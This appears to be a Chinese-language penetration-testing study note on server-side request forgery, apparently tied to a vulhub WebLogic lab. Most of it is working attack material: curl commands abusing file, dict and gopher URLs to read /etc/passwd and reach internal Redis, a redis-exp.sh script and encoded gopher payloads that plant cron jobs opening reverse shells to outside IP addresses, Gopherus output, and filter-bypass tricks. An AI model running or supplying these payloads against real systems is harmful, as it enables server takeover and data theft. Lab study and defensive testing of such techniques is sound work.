---
title: SSRF
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2021-04-19 15:03:37
top:
tags:
layout:
---
编写进度
- [x] 



靶机环境 https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf

https://github.com/hongriSec/Web-Security-Attack

https://blog.csdn.net/u012206617/article/details/108941738

https://my.oschina.net/u/4588149/blog/4436524

https://www.anquanke.com/post/id/197431

https://websec.readthedocs.io/zh/latest/vuln/ssrf.html

https://segmentfault.com/a/1190000021960060

https://*thorns.gitbooks.io/sec/content/teng\_xun\_mou\_chu\_ssrf\_lou\_6d1e28\_fei\_chang\_hao\_de*.html

https://my.oschina.net/u/4588149/blog/4436524

能发起对外请求且URL可控的地方都有可能存在ssrf（协议地址端口内容完全可控）

https://joner11234.github.io/article/9d7d2c7d.html

https://joner11234.github.io/article/9897b513.html

https://github.com/tarunkant/Gopherus

工具 ：http://xip.io/
http://xip.name

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

请求中常用参数share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain

![SSRF](https://raw.githubusercontent.com/crkmythical/Advanced-Ethical-Hacking-Training/main/Resource/img/20210419144323urlencode_all.png?token=ATXUKW6VO2E3WA5DV2YM6ITAPUTNK)

```zsh
# dict protocol (操作Redis)
curl -vvv 'dict://127.0.0.1:6379/info'

# file protocol (任意文件读取)
curl -vvv 'file:///etc/passwd'

# gopher protocol (一键反弹Bash)   * 注意: 链接使用单引号，避免$变量问题
curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
```

## 协议使用

（1）file： 在有回显的情况下，利用 file 协议可以读取任意内容

```zsh
curl -v 'http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd'
```

（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等

```zsh
curl -v 'http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/'
```

（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。

反弹shell脚本`redis-exp.sh`

```zsh
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.43.20/7777 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```

在本级上上运行socat查看执行的命令

```zsh
socat -v tcp-listen:4444,fork tcp-connect:10.211.55.4:6379   # 10.211.55.4 为目标机
sh redis-exp.sh
```

socat会输出 redis-exp 执行的内容

```zsh
*3\r
$3\r
set\r
$1\r
1\r
$65\r
-e 


*/1 * * * * bash -i >& /dev/tcp/192.168.43.26/7777 0>&1



\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$16\r
/var/spool/cron/\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$4\r
root\r
*1\r
$4\r
save\r
*1\r
$4\r
quit\r
^C%                       
``````zsh
curl -v 'http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a'
```

（4）http/s：探测内网主机存活

```zsh
curl -v 'http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1'
```

## Bypass

- [ ] 针对`Host`

```zsh
1. http://www.target.com@10.10.10.10  ->10.10.10.10
2. http://10.10.10.10#www.target.com  ->10.10.10.10
3. 10。10。10。10                     -> 10.10.10.10
3. xip.io & xip.name
4. tinyurl.com
6. ip编码绕过
7. [DNS Rebinding](https://github.com/Tr3jer/dnsAutoRebinding)
```

## SSRF探测内网Redis服务(burp intruder)

1.  利用http协议对内网进行探测，探测整个内网的存活ip， `curl http://www.target.com/ssrf.php?url=http://172.16.x.x`
2.  利用dict协议获取存活ip的6379端口banner信息 `curl http://www.target.com/ssrf.php?url=dict://172.16.55.23:6379/info`
3.  利用crontab写计划任务
    
    1.  URL全编码以下payload
    
    ```zsh
    test
    
    set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/vps/port 0>&1\n\n\n\n"
    config set dir /var/spool/root     
    config set dbfilename crontab
    save
    
    aaa
    ```
    
    2.  使用gopher协议发送payload
    
    ```zsh
    curl http://www.target.com/ssrf.php?url=gopher://172.16.55.23:6379/_%74%65%73%74%0d%0a%0d%0a%73%65%74%20%31%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%72%6f%6f%74%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%6c%51%69%70%2f%d1%2c%ef%e3%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%74%6d%70%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65%0d%0a%0d%0a%61%61%61
    +OK
    +OK
    +OK
    +OK
    
    ```
    
    2.  通过[Gopherus](https://github.com/tarunkant/Gopherus)生成RESP格式的payload
    
    ```zsh
    python gopherus.py --exploit redis
    Your gopher link is ready to get Reverse Shell:
    
    gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
    
    Before sending request plz do `nc -lvp 1234`
    ```

工具
[SSRFmap](https://github.com/swisskyrepo/SSRFmap)
[SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)
